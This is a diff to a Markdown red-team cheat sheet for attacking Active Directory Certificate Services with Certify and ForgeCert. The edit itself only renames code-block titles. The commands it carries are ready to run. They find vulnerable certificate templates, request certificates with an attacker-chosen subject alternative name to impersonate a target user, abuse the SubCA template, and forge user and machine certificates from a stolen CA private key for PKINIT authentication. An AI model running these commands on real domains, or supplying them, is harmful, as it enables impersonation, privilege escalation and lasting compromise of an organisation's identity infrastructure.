@@ -6,7 +6,7 @@
 
 Enumerate AD CS templates and highlight vulnerable configurations.
 
-```powershell title:"Find vulnerable AD CS templates"
+```powershell title:"Certify / ForgeCert Find vulnerable AD CS templates"
 .\Certify.exe find /vulnerable /enabled
 ```
 <!-- cheat -->
@@ -15,7 +15,7 @@ Enumerate AD CS templates and highlight vulnerable configurations.
 
 Enumerate templates, CAs, enrollment permissions, and relevant ACLs.
 
-```powershell title:"Enumerate templates and ACLs"
+```powershell title:"Certify / ForgeCert Enumerate templates and ACLs"
 .\Certify.exe find
 ```
 <!-- cheat -->
@@ -24,7 +24,7 @@ Enumerate templates, CAs, enrollment permissions, and relevant ACLs.
 
 List enterprise CAs and web enrollment endpoints.
 
-```powershell title:"Enumerate enterprise CAs"
+```powershell title:"Certify / ForgeCert Enumerate enterprise CAs"
 .\Certify.exe cas
 ```
 <!-- cheat -->
@@ -33,7 +33,7 @@ List enterprise CAs and web enrollment endpoints.
 
 Check CA web enrollment exposure for ESC8-style relay paths.
 
-```powershell title:"Find web enrollment endpoints"
+```powershell title:"Certify / ForgeCert Find web enrollment endpoints"
 .\Certify.exe cas /enrolleeSuppliesSubject
 ```
 <!-- cheat -->
@@ -44,7 +44,7 @@ Check CA web enrollment exposure for ESC8-style relay paths.
 
 Request a certificate from a template that allows enrollee-supplied subject alternative names.
 
-```powershell title:"Request cert with chosen SAN"
+```powershell title:"Certify / ForgeCert Request cert with chosen SAN"
 .\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"$target_user"
 ```
 <!-- cheat
@@ -58,7 +58,7 @@ var target_user
 
 Request a normal User template certificate for the current context.
 
-```powershell title:"Request User template certificate"
+```powershell title:"Certify / ForgeCert Request User template certificate"
 .\Certify.exe request /ca:"$domain\$ca_name" /template:"User"
 ```
 <!-- cheat
@@ -70,7 +70,7 @@ var ca_name
 
 Submit a SubCA request. This often pends; pair with ManageCA/ManageCertificates rights to approve and retrieve it.
 
-```powershell title:"Submit SubCA certificate request"
+```powershell title:"Certify / ForgeCert Submit SubCA certificate request"
 .\Certify.exe request /ca:"$ca_fqdn\$ca_name" /template:SubCA /altname:"$target_user"
 ```
 <!-- cheat
@@ -83,7 +83,7 @@ var target_user
 
 Download a certificate by request ID after approval.
 
-```powershell title:"Download issued certificate request"
+```powershell title:"Certify / ForgeCert Download issued certificate request"
 .\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
 ```
 <!-- cheat
@@ -98,7 +98,7 @@ var request_id
 
 Forge a certificate signed by a stolen CA private key. Use the resulting PFX with PKINIT tooling such as Rubeus or Certipy.
 
-```powershell title:"Forge certificate from stolen CA PFX"
+```powershell title:"Certify / ForgeCert Forge certificate from stolen CA PFX"
 .\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$target_user" --SubjectAltName "$target_upn" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
 ```
 <!-- cheat
@@ -114,7 +114,7 @@ var new_pfx_pass
 
 Forge a certificate for a machine principal.
 
-```powershell title:"Forge machine certificate"
+```powershell title:"Certify / ForgeCert Forge machine certificate"
 .\ForgeCert.exe --CaCertPath "$ca_pfx" --CaCertPassword "$ca_pfx_pass" --Subject "CN=$computer_name" --SubjectAltName "$computer_name@$domain" --NewCertPath "$new_pfx" --NewCertPassword "$new_pfx_pass"
 ```
 <!-- cheat
